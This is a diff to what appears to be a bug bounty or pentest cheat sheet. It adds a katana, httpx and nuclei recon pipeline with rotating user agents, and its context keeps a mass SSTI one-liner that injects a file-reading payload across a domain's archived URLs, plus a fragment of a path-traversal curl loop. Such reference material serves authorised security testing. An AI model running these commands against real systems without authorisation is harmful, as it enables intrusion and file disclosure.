@@ -21,6 +21,7 @@
 - [Hunting Checklist](#hunting-checklist)
 - [Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)](#path-traversal-zero-day-in-apache-http-server-cve-2021-41773)
 - [Server-Side Template Injection (SSTI) at Scale](#server-side-template-injection-ssti-at-scale)
+- [Target Enrichment](#target-enrichment)
 - [Wayback Machine](#wayback-machine)
 - [waybackurls](#waybackurls)
 - [Web Shell / Malicious Images](#web-shell-malicious-images)
@@ -350,6 +351,34 @@ $ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure
 
 ```console
 $ echo "<DOMAIN>" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/hostname').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
+```
+
+## Target Enrichment
+
+### Prerequisites
+
+#### Katana
+
+```console
+$ CGO_ENABLED=1 go install github.com/projectdiscovery/katana/cmd/katana@latest
+```
+
+#### httpx
+
+```console
+$ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+```
+
+#### Nuclei
+
+```console
+$ go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+```
+
+#### Execution
+
+```console
+$ katana -u <URL> -hl -jc --no-sandbox -c 1 -p 1 -rd 3 -rl 5 -H "User-Agent: $(shuf -n 1 -e 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 'Mozilla/5.0 (x11; Linux x86_64)' 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)')" | httpx -silent -status-code -follow-redirects -tls-probe -random-agent -fr | nuclei -headless -sresp -rate-limit 25 -concurrency 20 -severity critical,high,medium -tags login,auth,exposure,api -markdown-export output/ -H "User-Agent: $(shuf -n 1 -e 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 'Mozilla/5.0 (x11; Linux x86_64)' 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)')" -tlsi -stats
 ```
 
 ## Wayback Machine
